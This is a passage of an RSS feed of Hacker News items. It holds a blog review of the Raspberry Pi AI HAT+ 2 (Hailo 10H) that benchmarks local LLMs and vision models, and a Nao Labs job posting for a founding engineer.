&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46629610</guid><pubDate>Thu, 15 Jan 2026 08:12:46 +0000</pubDate></item><item><title>Raspberry Pi's New AI Hat Adds 8GB of RAM for Local LLMs</title><link>https://www.jeffgeerling.com/blog/2026/raspberry-pi-ai-hat-2/</link><description>&lt;doc fingerprint="fe7514741c06875a"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Raspberry Pi's new AI HAT adds 8GB of RAM for local LLMs&lt;/head&gt;
    &lt;p&gt;Today Raspberry Pi launched their new $130 AI HAT+ 2 which includes a Hailo 10H and 8 GB of LPDDR4X RAM.&lt;/p&gt;
    &lt;p&gt;With that, the Hailo 10H is capable of running LLMs entirely standalone, freeing the Pi's CPU and system RAM for other tasks. The chip runs at a maximum of 3W, with 40 TOPS of INT8 NPU inference performance in addition to the equivalent 26 TOPS INT4 machine vision performance on the earlier AI HAT with Hailo 8.&lt;/p&gt;
    &lt;p&gt;In practice, it's not as amazing as it sounds.&lt;/p&gt;
    &lt;p&gt;You still can't upgrade the RAM on the Pi, but at least this way if you do have a need for an AI coprocessor, you don't have to eat up the Pi's memory to run things on it.&lt;/p&gt;
    &lt;p&gt;And it's a lot cheaper and more compact than running an eGPU on a Pi. In that sense, it's more useful than the silly NPUs Microsoft forces into their 'AI PCs'.&lt;/p&gt;
    &lt;p&gt;But it's still a solution in search of a problem, in all but the most niche of use cases.&lt;/p&gt;
    &lt;p&gt;Besides feeling like I'm living in the world of the Turbo Encabulator every time I'm testing AI hardware, I find the marketing of these things to be very vague, and the applications not very broad.&lt;/p&gt;
    &lt;p&gt;For example, the Hailo 10H is advertised as being used for a Fujitsu demo of automatic shrink detection for a self-checkout.&lt;/p&gt;
    &lt;p&gt;That's certainly not a worthless use case, but it's not something I've ever needed to do. I have a feeling this board is meant more for development, for people who want to deploy the 10H in other devices, rather than as a total solution to problems individual Pi owners need to solve.&lt;/p&gt;
    &lt;p&gt;Especially when it comes to the headline feature: running inference, like with LLMs.&lt;/p&gt;
    &lt;head rend="h2"&gt;Video&lt;/head&gt;
    &lt;p&gt;I also published a video with all the information in this blog post, but if you enjoy text more than video, scroll on pastâit doesn't offend me!&lt;/p&gt;
    &lt;head rend="h2"&gt;LLM performance on the AI HAT+ 2&lt;/head&gt;
    &lt;p&gt;I ran everything on an 8 gig Pi 5, so I could get an apples-to-apples comparison, running the same models on the Pi's CPU as I did on the AI HAT's NPU.&lt;/p&gt;
    &lt;p&gt;They both have the same 8GB LPDDR4X RAM configuration, so ideally, they'd have similar performance.&lt;/p&gt;
    &lt;p&gt;I tested every model Hailo put out so far, and compared them, Pi 5 versus Hailo 10H:&lt;/p&gt;
    &lt;p&gt;The Pi's built-in CPU trounces the Hailo 10H.&lt;/p&gt;
    &lt;p&gt;The Hailo is only close, really, on Qwen2.5 Coder 1.5B.&lt;/p&gt;
    &lt;p&gt;It is slightly more efficient in most cases:&lt;/p&gt;
    &lt;p&gt;But looking more closely at power draw, we can see why the Hailo doesn't keep up:&lt;/p&gt;
    &lt;p&gt;The Pi's CPU is allowed to max out it's power limits (10W on the SoC), which are a lot higher than the Hailo's (3W).&lt;/p&gt;
    &lt;head rend="h2"&gt;Qwen 30B on a Pi&lt;/head&gt;
    &lt;p&gt;So power holds it back, but the 8 gigs of RAM holds back the LLM use case (vs just running on the Pi's CPU) the most. The Pi 5 can be bought in up to a 16 GB configuration. That's as much as you get in decent consumer graphics cards1.&lt;/p&gt;
    &lt;p&gt;Because of that, many quantized medium-size models target 10-12 GB of RAM usage (leaving space for context, which eats up another 2+ GB of RAM).&lt;/p&gt;
    &lt;p&gt;A couple weeks ago, ByteShape got Qwen3 30B A3B Instruct to fit on a 16GB Pi 5. Now this post isn't about LLMs, but the short of it is they found a novel way to compress the model to fit in 10 GB of RAM.&lt;/p&gt;
    &lt;p&gt;A little bit of quality is lost, but like a JPEG, it's still good enough to ace all the contrived tests (like building a TODO list app, or sorting a complex list) that the tiny models I ran on the Hailo 10H didn't complete well (see the video earlier in this post for details).&lt;/p&gt;
    &lt;p&gt;To test the 30B model, I installed llama.cpp following this guide from my blog, and downloaded the compressed model.&lt;/p&gt;
    &lt;p&gt;I asked it to generate a single page TODO list app, and it's still not a speed demon (this is a Pi CPU with LPDDR4x RAM we're talking about), but after a little while, it gave me this:&lt;/p&gt;
    &lt;p&gt;It met all my requirements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I can type in as many items as I want&lt;/item&gt;
      &lt;item&gt;I can drag them around to rearrange them&lt;/item&gt;
      &lt;item&gt;I can check off items and they go to the bottom of the list...&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It's honestly crazy how many small tasks you can do even with free local models... even on a Pi. Natural Language Programming was just a dream back when I started my career.&lt;/p&gt;
    &lt;p&gt;Besides being angry Google, OpenAI, Anthropic and all these other companies are consuming all the world's money and resources doing this stuffânot to mention destroying the careers of thousands of junior developersâit is kinda neat to see NLP work for very tightly defined examples.&lt;/p&gt;
    &lt;head rend="h2"&gt;Benchmarking computer vision&lt;/head&gt;
    &lt;p&gt;But I don't think this HAT is the best choice to run local, private LLMs (at least not as a primary goal).&lt;/p&gt;
    &lt;p&gt;What it is good for, is vision processing. But the original AI HAT was good for that too!&lt;/p&gt;
    &lt;p&gt;In my testing, Hailo's hailo-rpi5-examples were not yet updated for this new HAT, and even if I specified the Hailo 10H manually, model files would not load, or I ran into errors once the board was detected.&lt;/p&gt;
    &lt;p&gt;But Raspberry Pi's models ran, so I tested them with a Camera Module 3:&lt;/p&gt;
    &lt;p&gt;I pointed it over at my desk, and it was able to pick out things like my keyboard, my monitor (which it thought was a TV), my phone, and even the mouse tucked away in the back.&lt;/p&gt;
    &lt;p&gt;It all ran quite fastâand 10x faster than on the Pi's CPUâbut the problem is I can do the same thing with the original AI HAT ($110)âor the AI Camera ($70).&lt;/p&gt;
    &lt;p&gt;If you just need vision processing, I would stick with one of those.&lt;/p&gt;
    &lt;p&gt;The headline feature of the AI HAT+ 2 is the ability to run in a 'mixed' mode, where it can process machine vision (frames from a camera or video feed), while also running inference (like an LLM or text-to-speech).&lt;/p&gt;
    &lt;p&gt;Unfortunately, when I tried running two models simultaneously, I ran into segmentation faults or 'device not ready', and lacking any working examples from Hailo, I had to give up on getting that working in time for this post.&lt;/p&gt;
    &lt;p&gt;Just like the original AI HAT, there's some growing pains.&lt;/p&gt;
    &lt;p&gt;It seems like with most hardware with "AI" in the name, it's hardware-first, then software comes laterâif it comes at all. At least with Raspberry Pi's track record, the software does come, it's just... often the solutions are only useful in tiny niche use cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;8 GB of RAM is useful, but it's not quite enough to give this HAT an advantage over just paying for the bigger 16GB Pi with more RAM, which will be more flexible and run models faster.&lt;/p&gt;
    &lt;p&gt;The main use case for this HAT might be in power-constrained applications where you need both vision processing and inferencing. But even there... it's hard to say "yes, buy this thing", because for just a few more watts, the Pi could achieve better performance for inference in tandem with the $70 AI Camera or the $110 AI HAT+ for the vision processing.&lt;/p&gt;
    &lt;p&gt;Outside of running tiny LLMs in less than 10 watts, maybe the idea is you use the AI HAT+ 2 as a development kit for designing devices using the 10H like self-checkout scanners (which might not even run on a Pi)? I'm not sure.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;With the obvious caveat that the VRAM on GPUs runs a lot faster than equivalent LPDDR4 RAM on a Pi! ↩︎&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46629682</guid><pubDate>Thu, 15 Jan 2026 08:23:02 +0000</pubDate></item><item><title>Nao Labs (Open-Source Analytics Agent, YC X25) Is Hiring</title><link>https://www.ycombinator.com/companies/nao-labs/jobs/KjOBhf5-founding-software-engineer</link><description>&lt;doc fingerprint="e9cee3477d95e4ac"&gt;
  &lt;main&gt;
    &lt;p&gt;AI data IDE&lt;/p&gt;
    &lt;p&gt;Founding software engineer — Build the future of data teams experience.&lt;/p&gt;
    &lt;p&gt;Location: Paris 11, France&lt;/p&gt;
    &lt;p&gt;Hello, we're nao Labs&lt;/p&gt;
    &lt;p&gt;We are building an open-source AI agent for data analytics.&lt;/p&gt;
    &lt;p&gt;We are an early stage start-up with 2 cofounders - we joined Y Combinator Spring 2025 batch and STATION F and are now based in Paris 11.&lt;/p&gt;
    &lt;p&gt;We already have a first product - AI IDE for data people - used by 100+ data teams. We are now rolling out a new product - the open source analytics agent. So we’re looking for a founding engineer to help us build it!&lt;/p&gt;
    &lt;p&gt;We are a cofounding team with 18+ years experience in data/AI:&lt;/p&gt;
    &lt;p&gt;We're looking for&lt;/p&gt;
    &lt;p&gt;As a founding engineer, you'll join us to inventing a new, better way to work on data with AI.&lt;/p&gt;
    &lt;p&gt;You will be a fit if...&lt;/p&gt;
    &lt;p&gt;You will&lt;/p&gt;
    &lt;p&gt;You are&lt;/p&gt;
    &lt;p&gt;Tech&lt;/p&gt;
    &lt;p&gt;The product uses these main technologies:&lt;/p&gt;
    &lt;p&gt;Front: React, Typescript&lt;/p&gt;
    &lt;p&gt;Back: node.js, Python&lt;/p&gt;
    &lt;p&gt;Agentic system: Vercel, OpenAI, Anthropic&lt;/p&gt;
    &lt;p&gt;Apply&lt;/p&gt;
    &lt;p&gt;Start Date: Flexible&lt;/p&gt;
    &lt;p&gt;Compensation: competitive salary + early equity&lt;/p&gt;
    &lt;p&gt;Location: Mainly on-site in our Paris 11 office. Remote available.&lt;/p&gt;
    &lt;p&gt;Join us at nao Labs and help shape the future of data work. Let’s build something incredible together!&lt;/p&gt;
    &lt;p&gt;At nao Labs, we are reimagining how data work gets done. Data work is different from traditional software development, and it deserves a specialised workflow. That’s why we’re creating nao—an AI-powered code editor tailored for data workers.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46629957</guid><pubDate>Thu, 15 Jan 2026 08:59:27 +0000</pubDate></item></channel></rss>